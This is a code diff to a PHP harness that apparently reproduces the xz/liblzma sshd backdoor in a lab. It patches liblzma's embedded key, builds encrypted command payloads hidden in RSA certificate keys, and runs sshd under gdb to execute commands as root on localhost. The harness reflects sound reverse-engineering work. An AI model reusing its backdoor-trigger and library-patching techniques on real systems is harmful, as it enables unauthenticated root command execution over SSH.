@@ -8,9 +8,18 @@
  */
 
 use FFI\CData;
+use phpseclib3\Common\Functions\Strings;
+use phpseclib3\Crypt\Common\AsymmetricKey;
+use phpseclib3\Crypt\Common\PublicKey as CommonPublicKey;
 use phpseclib3\Crypt\EC;
+use phpseclib3\Crypt\EC\Curves\Ed448;
+use phpseclib3\Crypt\PublicKeyLoader;
 use phpseclib3\Crypt\RSA;
+use phpseclib3\Crypt\RSA\PrivateKey;
+use phpseclib3\Crypt\RSA\PublicKey;
+use phpseclib3\File\X509;
 use phpseclib3\Math\BigInteger;
+use phpseclib3\Net\SSH2;
 
 require_once __DIR__ . '/vendor/autoload.php';
 require_once __DIR__ . '/common.php';
@@ -35,6 +44,16 @@ define('O_NOATIME',  01000000);
 define('O_CLOEXEC',  02000000);        /* set close_on_exec */
 define('O_NDELAY',  O_NONBLOCK);
 
+abstract class Flags1 {
+    public const SETLOGMASK = 0x4;
+    public const DISABLE_PAM = 0x40;
+}
+
+abstract class Flags2 {
+    public const IMPERSONATE = 0x1;
+    public const CHANGE_MONITOR_REQ = 0x2;
+}
+
 class Invoker {
     private FFI $ffi;
     private FFI $crypto;
@@ -47,9 +66,7 @@ class Invoker {
         );
 
         $this->crypto = FFI::cdef('
-            typedef void BIGNUM;
-            typedef void RSA;
-            typedef void BIO;
+            typedef void BIGNUM, RSA, DSA, BIO, EVP_PKEY;
 
             RSA *RSA_new(void);
             void RSA_free(RSA *rsa);
@@ -58,6 +75,13 @@ class Invoker {
 
             BIO *BIO_new_mem_buf(const void *buf, int len);
             RSA *PEM_read_bio_RSA_PUBKEY(BIO *bp, RSA **x, void *cb, void *u);
+            DSA *PEM_read_bio_DSA_PUBKEY(BIO *bp, DSA **x, void *cb, void *u);
+            EVP_PKEY *PEM_read_bio_PUBKEY(BIO *bp, EVP_PKEY **x, void *cb, void *u);
+
+            char *ERR_error_string(unsigned long e, char *buf);
+            unsigned long ERR_get_error(void);
+            int RSA_size(const RSA *rsa);
+
             int BIO_free(BIO *a);
             ','libcrypto.so'
         );
@@ -131,8 +155,8 @@ class Invoker {
         $monitor_req_keyallowed_ptr = FFI::cast('uintptr_t', FFI::addr($this->nat_monitor_req_keyallowed));
         $monitor_req_keyallowed_ptr->cdata += 4 + 4;
 
-        $this->nat_sshd_ctx->monitor_req_authpassword = FFI::cast('void *', $monitor_req_authpassword_ptr);
-        $this->nat_sshd_ctx->monitor_req_keyallowed_ptr = FFI::cast('void *', $monitor_req_keyallowed_ptr);
+        $this->nat_sshd_ctx->mm_answer_authpassword_ptr = FFI::cast('void *', $monitor_req_authpassword_ptr);
+        $this->nat_sshd_ctx->mm_answer_keyallowed_ptr = FFI::cast('void *', $monitor_req_keyallowed_ptr);
         $this->nat_sshd_ctx->have_mm_answer_keyallowed = 1;
         $this->nat_sshd_ctx->have_mm_answer_authpassword = 1;
         $this->nat_sshd_ctx->have_mm_answer_keyverify = 1;
@@ -147,7 +171,7 @@ class Invoker {
         $this->nat_ctx->STR_ssh_rsa_cert_v01_openssh_com = FFI::cast('char *', FFI::addr($this->nat_STR_ssh_rsa_cert_v01_openssh_com));
         $this->nat_ctx->STR_rsa_sha2_256 = FFI::cast('char *', FFI::addr($this->nat_STR_rsa_sha2_256));
 
-        $this->nat_ctx->num_shifted_bits = ED448_PUBKEY_SIZE * 8;
+        $this->nat_ctx->num_shifted_bits = ED448_KEY_SIZE * 8;
         $this->nat_ctx->imported_funcs = FFI::addr($this->nat_imported_funcs);
         $this->nat_ctx->libc_imports = FFI::addr($this->nat_libc_imports);
         $this->nat_ctx->sshd_log_ctx = FFI::addr($this->nat_sshd_log_ctx);
@@ -259,13 +283,15 @@ class Invoker {
 
     private function init_ed448_key(){
         $privkey_path = path_combine(__DIR__, 'ed448_key.pem');
-        if(file_exists($privkey_path)){
-            $privkey = EC::load(file_get_contents('ed448_key.pem'));
-        } else {
+
+        if(!file_exists($privkey_path)){
             /** create Ed448 private and public key pairs */
-            $privkey = EC::createKey('Ed448');
-            file_put_contents($privkey_path, $privkey->toString('PKCS8'));
+            // $privkey = EC::createKey('Ed448');
+            // file_put_contents($privkey_path, $privkey->toString('PKCS8'));
+            $der = hex2bin('3047020100300506032B6571043B0420') . str_repeat("\x00", ED448_KEY_SIZE);
+            file_put_contents($privkey_path, der2pem($der, 'PRIVATE KEY'));
         }
+        $privkey = EC::load(file_get_contents($privkey_path));
 
         $this->ed448_privkey = $privkey;
         $this->ed448_pubkey = $privkey->getPublicKey();
@@ -274,47 +300,69 @@ class Invoker {
     /**
      * @return CData
      */
-    private function nat_openssl_pkcs8_load(string $pem_public_key){
+    private function nat_openssl_pkcs8_load(CommonPublicKey $public_key){
+        $pem = $public_key->toString('PKCS8');
+
         /** @var mixed */
         $ffi = $this->crypto;
-        $rsa = $ffi->new('RSA *');
+        $handle = $ffi->new('void *');
 
-        $buf = make_array(strlen($pem_public_key));
-        FFI::memcpy($buf, $pem_public_key, strlen($pem_public_key));
-        $bio = $ffi->BIO_new_mem_buf($buf, strlen($pem_public_key));
-        $rsa_key = $ffi->PEM_read_bio_RSA_PUBKEY($bio, FFI::addr($rsa), null, null);
+        $buf = make_array(strlen($pem));
+        FFI::memcpy($buf, $pem, strlen($pem));
+        $bio = $ffi->BIO_new_mem_buf($buf, strlen($pem));
+        if($public_key instanceof \phpseclib3\Crypt\RSA\PublicKey){
+            $nat_key = $ffi->PEM_read_bio_RSA_PUBKEY($bio, FFI::addr($handle), null, null);
+        } else {
+            $nat_key = $ffi->PEM_read_bio_DSA_PUBKEY($bio, FFI::addr($handle), null, null);
+        }
         $ffi->BIO_free($bio);
-        return $rsa_key;
+        return $nat_key;
     }
 
     private ?CData $nat_ssh_hostkey_pub = null;
     private string $ssh_hostkey_digest;
 
-    private function init_ssh_hostkey(){
-        /** create fake RSA key */
-        $hostkey = RSA::loadPublicKey([
-            'n' => new BigInteger(1337),
-            'e' => new BigInteger(3)
-        ]);
+    private function init_ssh_hostkey(?AsymmetricKey $hostkey = null){
+        if($hostkey === null){
+            /** create fake RSA key */
+            $hostkey = RSA::loadPublicKey([
+                'n' => new BigInteger(1337),
+                'e' => new BigInteger(3)
+            ]);
+        } else {
+            if($hostkey instanceof phpseclib3\Crypt\EC\PublicKey){
+                $curve = $hostkey->getCurve();
+                if($curve == 'Ed25519'){
+                    $data = pack('V', 0x20000000) . $hostkey->getEncodedCoordinates();
+                    $this->ssh_hostkey_digest = hash('sha256', $data, true);
+                    return;
+                }
+            }
+        }
 
         /** load host key into an OpenSSL RSA key structure */
-        $this->nat_ssh_hostkey_pub = $this->nat_openssl_pkcs8_load($hostkey->toString('PKCS8'));
+        $this->nat_ssh_hostkey_pub = $this->nat_openssl_pkcs8_load($hostkey);
 
         /** obtain hostkey hash */
         $buf = make_array(SHA256_DIGEST_SIZE);
         
         /** @var mixed */
         $ffi = $this->ffi;
-        if(!$ffi->rsa_key_hash($this->nat_ssh_hostkey_pub, $buf, SHA256_DIGEST_SIZE, $this->nat_ctx->imported_funcs)){
-            error("rsa_key_hash FAILED");
+
+        $res = false;
+        if($hostkey instanceof PublicKey){
+            $res = $ffi->rsa_key_hash($this->nat_ssh_hostkey_pub, $buf, SHA256_DIGEST_SIZE, $this->nat_ctx->imported_funcs);
+        } else {
+            $res = $ffi->dsa_key_hash($this->nat_ssh_hostkey_pub, $buf, SHA256_DIGEST_SIZE, FFI::addr($this->nat_ctx));
+        }
+        if(!$res){
+            error("key_hash FAILED");
             die;
         }
         $this->ssh_hostkey_digest = cdata_bytes($buf);
     }
 
     private function payload_make_header(int $cmd_type){
-        // cmd_type = (a * b) + c
-        // both `a` and `b` must be non-zero
         return pack('VVP', 1, $cmd_type, 0);
     }
 
@@ -350,12 +398,19 @@ class Invoker {
         say('payload_body: ' . bin2hex($payload_body));
 
         $pubkey_data = $this->ed448_pubkey->getEncodedCoordinates();
-        $payload_body_encrypted = openssl_encrypt($payload_body, 'chacha20', $pubkey_data, OPENSSL_RAW_DATA, $payload_hdr);
-        
-        return (''
+
+        // use header as IV
+        $ivec = substr($payload_hdr, 0, CHACHA20_IV_SIZE);
+        // use public key as encryption key
+        $key = substr($pubkey_data, 0, CHACHA20_KEY_SIZE);
+        $payload_body_encrypted = openssl_encrypt($payload_body, 'chacha20', $key, OPENSSL_RAW_DATA, $ivec);
+       
+        $final = (''
             . $payload_hdr
             . $payload_body_encrypted
         );
+        $final = str_pad($final, 256, "\x00", STR_PAD_RIGHT);
+        return $final;
     }
 
     private function payload_make_bypass_auth(){
@@ -367,11 +422,27 @@ class Invoker {
         return $this->payload_make($cmd_type, $packet);
     }
 
-    private function payload_make_exec(string $shell_cmd){
+    private function payload_make_exec(string $shell_cmd, int $uid = 0, int $gid = 0){
         $cmd_type = 2;
+
+        $flags1 = Flags1::DISABLE_PAM /*| Flags1::SETLOGMASK*/;
+        $flags2 = Flags2::CHANGE_MONITOR_REQ; 
+        $flags3 = 22; // MONITOR_REQ_KEYALLOWED
+
+        $extra_data = '';
+
+        if($uid != 0 || $gid != 0){
+            $flags2 |= Flags2::IMPERSONATE;
+            $extra_data .= (''
+                . encode_data(4, $uid)
+                . encode_data(4, $gid)
+            );
+        }
+
         $packet = (''
-            . $this->payload_make_args(0, 0, 0, strlen($shell_cmd))
-            . $shell_cmd
+            . $this->payload_make_args($flags1, $flags2, $flags3, strlen($shell_cmd) + 1)
+            . $extra_data
+            . $shell_cmd . "\x00"
         );
         return $this->payload_make($cmd_type, $packet);
     }
@@ -382,6 +453,26 @@ class Invoker {
             . $this->payload_make_args(0, 0, 0, 0)
         );
         return $this->payload_make($cmd_type, $packet);
+    }
+
+    private function payload_encode_private(string $payload){
+        $one = new BigInteger(1);
+
+        $n = new BigInteger(bin2hex($payload), 16);
+
+        $e = new BigInteger(3);
+        $p = new BigInteger(1);
+        $q = clone $n;
+        $d = $e->modInverse($p->subtract($one)->multiply($q->subtract($one)));
+        $pkey = RSA::loadPrivateKey([
+            'n' => $n,
+            'e' => $e,
+            'p' => $p,
+            'q' => $q,
+            'd' => $d
+        ]);
+
+        return $pkey;
     }
 
     private function payload_encode(string $payload){
@@ -403,6 +494,11 @@ class Invoker {
         $this->init_structures_part0();
         $this->init_ssh_hostkey();
         $this->init_structures_part1();
+
+        $data_dir = $this->gdb_file();
+        if(!file_exists($data_dir)){
+            mkdir($data_dir);
+        }
     }
 
     
@@ -531,10 +627,278 @@ class Invoker {
             $this->nat_RSA_free($this->nat_ssh_hostkey_pub);
         }
     }
+
+    private function gdb_kill_listeners(){
+        $sshd_proc = rtrim(shell_exec(''
+        . 'netstat -tanop'
+        . '|grep -Po "^tcp\s.*:2022\s.*LISTEN.*"'
+        . '|head -n1'
+        . '|perl -pe "s|.*?LISTEN\s+||g"'
+        ));
+        if(empty($sshd_proc)) return;
+        list($pid, $_) = explode('/', $sshd_proc);
+        posix_kill($pid, SIGKILL);
+    }
+
+    private bool $gdb_sshd_fork = true;
+    private bool $gdb_wait_loop = false;
+
+    private function gdb_start_sshd(){
+        file_put_contents('/tmp/sshd_config', <<<EOS
+        Port 2022
+        LogLevel Debug3
+        KbdInteractiveAuthentication no
+        UsePAM yes
+        X11Forwarding yes
+        PrintMotd no
+        AcceptEnv LANG LC_*
+        Subsystem       sftp    /usr/lib/openssh/sftp-server
+
+        EOS);
+
+        $file_pid_main = path_combine(__DIR__, 'gdb', 'pid_main');
+        $file_pid_file = path_combine(__DIR__, 'gdb', 'pid');
+        
+        if(file_exists($file_pid_main)) unlink($file_pid_main);
+        if(file_exists($file_pid_file)) unlink($file_pid_file);
+
+        say('starting sshd');
+        $gdb = proc_open(
+            ['gdb', '-x', path_combine(__DIR__, 'gdb/run_sshd.gdb')],
+            [], $p,
+            __DIR__,
+            ['GDB_DETACH' => '1',
+            'GDB_WAIT_LOOP' => $this->gdb_wait_loop ? '1' : '0']
+        );
+
+        for(;;usleep(1000)){
+            if(file_exists($file_pid_main)){
+                $pid_main = intval(file_get_contents($file_pid_main));
+                unlink($file_pid_main);
+
+                // break endless loop
+                say('sending sigint');
+                posix_kill($pid_main, SIGINT);
+                continue;
+            }
+            if(!file_exists($file_pid_file)){
+                continue;
+            }
+            $sshd_pid = intval(file_get_contents($file_pid_file));
+            break;
+        }
+
+        proc_close($gdb);
+        return $sshd_pid;
+    }
+
+    private function gdb_attach_sshd(int $sshd_pid){
+        $gdb = rtrim(shell_exec('which gdb'));
+        $env = getenv();
+        $env['GDB_TARGET'] = $sshd_pid;
+        if($this->gdb_sshd_fork){
+            $env['GDB_OPMODE'] = 'child';
+        }
+
+        pcntl_exec($gdb,
+            ['-x', path_combine(__DIR__, 'gdb/sshd_child.gdb')],
+            $env);
+    }
+
+    private function gdb_file(string ...$parts){
+        return path_combine(__DIR__, 'gdb', ...$parts);
+    }
+
+    private function patch_liblzma(){
+        $fname = '/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1';
+        $orig_hash = '7ae37dfaf5cf7f6568ad00915a665cbd2486c50d63d1ad1d1afed771503f04d0376b95072f2b663d0a82692edecd668b2500b82309abdf8772a3345f13ffe02b';
+
+        $data = file_get_contents($fname);
+        if(hash('sha512', $data) !== $orig_hash){
+            throw new RuntimeException();
+        }
+
+        // secret_data_get_decrypted
+        $pos = strpos($data, hex2bin('F30F1EFA4885FF0F848E000000415455'));
+        if($pos === false) throw new RuntimeException;
+
+        $pubkey_data = $this->ed448_pubkey->getEncodedCoordinates();
+
+        if(true){
+            $patch = (''
+                . "\x48\x8d\x35" . pack('V', 0xC) // lea rsi,[rip+0xc]
+                . "\xb9" . pack('V', 57) // mov ecx, 57
+                . "\xf3\xa4" // rep movsb
+                . "\x31\xc0" // xor eax, eax
+                . "\xff\xc0" // inc eax
+                . "\xc3" // ret
+                . $pubkey_data
+            );
+            $data = patch_data($data, $pos, $patch);
+
+            // process_is_sshd
+            $pos = strpos($data, hex2bin('554889E54157415641554154534883EC2848897DB84839F5'));
+            if($pos === false) throw new RuntimeException;
+
+            $patch = (''
+                . "\x31\xc0" // xor eax, eax
+                . "\xff\xc0" // inc eax
+                . "\xc3" // ret
+            );
+            $data = patch_data($data, $pos, $patch);
+        }
+
+        if(false){
+            // mm_answer_keyallowed_hook
+            $pos = strpos($data, hex2bin('F30F1EFA415741564155415455534881EC28010000'));
+            if($pos === false) throw new RuntimeException;
+            $patch = "\xEB\xFE\x90\x90";
+            $data = patch_data($data, $pos, $patch);
+        }
+
+        $lib_dir = '/tmp/xzre';
+        if(!file_exists($lib_dir)) mkdir($lib_dir);
+
+        $lib_name = basename($fname);
+        symlink($lib_name, path_combine($lib_dir, 'liblzma.so.5'));
+        symlink($lib_name, path_combine($lib_dir, 'liblzma.so'));
+
+        if($this->gdb_wait_loop){
+            // backdoor_setup
+            $pos = strpos($data, hex2bin('F30F1EFA415731C04989FFB956020000'));
+            if($pos === false) throw new RuntimeException;
+
+            $patch = (''
+                // int 3, nop (replaces endbr64)
+                //. "\xCC\x90\x90\x90"
+                . "\xEB\xFE\x90\x90"
+            );
+            $data = patch_data($data, $pos, $patch);
+        }
+
+        file_put_contents(
+            path_combine($lib_dir, $lib_name),
+            $data);
+    }
+
+    private function debug_disable_aslr(){
+        file_put_contents('/proc/sys/kernel/randomize_va_space', "0\n");
+    }
+
+    public function ssh_client_main(){
+        $ssh = new SSH2('localhost', 22);
+        $hostKey = PublicKeyLoader::load($ssh->getServerPublicHostKey());
+        $this->init_ssh_hostkey($hostKey);
+
+        /** write payload, RSA-encoded */
+        $payload = $this->payload_make_exec('id > /tmp/out.txt');
+
+        /** @var PrivateKey */
+        $pkey = $this->payload_encode_private($payload);
+        file_put_contents($this->gdb_file('id_rsa'), $pkey->toString('OPENSSH'));
+
+        /** @var PublicKey */
+        $pub = $pkey->getPublicKey();
+        file_put_contents($this->gdb_file('id_rsa.pub'), $pub->toString('OPENSSH'));
+
+        file_put_contents($this->gdb_file('n.bin'), $payload);
+
+        /** @var PrivateKey */
+        $ssh_sign_key = $pkey
+            ->withPadding(RSA::SIGNATURE_PKCS1)
+            ->withHash('sha512');
+
+
+        $cert_type = 'ssh-rsa-cert-v01@openssh.com';
+        $nonce = openssl_random_pseudo_bytes(32);
+
+        $raw_pub = $pub->toString('RAW');
+
+        $extensions = (''
+            . Strings::packSSH2('ss', 'permit-X11-forwarding', '')
+            . Strings::packSSH2('ss', 'permit-agent-forwarding', '')
+            . Strings::packSSH2('ss', 'permit-port-forwarding', '')
+            . Strings::packSSH2('ss', 'permit-pty', '')
+            . Strings::packSSH2('ss', 'permit-user-rc', '')
+        );
+        $encoded_sign_key = Strings::packSSH2('sii', 'ssh-rsa', $raw_pub['e'], $raw_pub['n']);
+        $principals = Strings::packSSH2('s', 'nobody');
+
+        $time_from = time() - 60;
+        $time_to = time() + 86400;
+
+        $dummy = RSA::createKey(2048);
+        $raw_dummy = $dummy->getPublicKey()->toString('RAW');
+
+        $packet = (''
+            . Strings::packSSH2('s', $cert_type)
+            . Strings::packSSH2('s', $nonce)
+            /** public exponent and modulus (ignored by payload, which uses the signing key) */
+            . Strings::packSSH2('i', $raw_dummy['e'])
+            . Strings::packSSH2('i', $raw_dummy['n'])
+            . Strings::packSSH2('Q', 0) // serial
+            . Strings::packSSH2('N', 1) // SSH_CERT_TYPE_USER
+            . Strings::packSSH2('s', 'Client') // key id
+            . Strings::packSSH2('s', $principals) // valid principals
+            . Strings::packSSH2('Q', $time_from)
+            . Strings::packSSH2('Q', $time_to)
+            . Strings::packSSH2('s', '') // critical options
+            . Strings::packSSH2('s', $extensions)
+            . Strings::packSSH2('s', '') // reserved
+            /** public key of the signing key (contains payload) */
+            . Strings::packSSH2('s', $encoded_sign_key)
+        );
+        $packet_sig = $ssh_sign_key->sign($packet);
+        $packet_sig_enc = Strings::packSSH2('ss', 'rsa-sha2-512', $packet_sig);
+        $packet .= Strings::packSSH2('s', $packet_sig_enc);
+
+        file_put_contents($this->gdb_file('id_rsa-cert2.bin'), $packet);
+        file_put_contents($this->gdb_file('id_rsa-cert2.pub'), (''
+            . $cert_type
+            . ' ' . base64_encode($packet)
+            . ' ' . 'phpseclib-generated-key'
+            . "\n"
+        ));
+
+        //$sshd_port = 22;
+        $sshd_port = 2022;
+
+        say('running ssh client');
+        pcntl_exec('/root/sshd/openssh/openssh-9.6p1/ssh', [
+            '-vvvv',
+            '-i', $this->gdb_file('id_rsa-cert2.pub'),
+            '-p', $sshd_port,
+            'root@localhost'
+        ]);
+    }
+
+    public function ssh_server_main(){
+        $this->debug_disable_aslr();
+        $this->patch_liblzma();
+        $this->gdb_kill_listeners();
+        $sshd_pid = $this->gdb_start_sshd();
+        if($sshd_pid === false) throw new RuntimeException();
+        // does not return
+        $this->gdb_attach_sshd($sshd_pid);
+        die;
+    }
 }
 
-
 $invoker = new Invoker;
+
+if($argc > 1){
+    switch($argv[1]){
+        case '-server':
+            chdir(__DIR__);
+            $invoker->ssh_server_main();
+            exit(0);
+        case '-client':
+            chdir(__DIR__);
+            $invoker->ssh_client_main();
+            exit(0);
+    }
+}
+
 
 $run_backdoor_commands = 0x9490;
 $jmp_bad_data = [
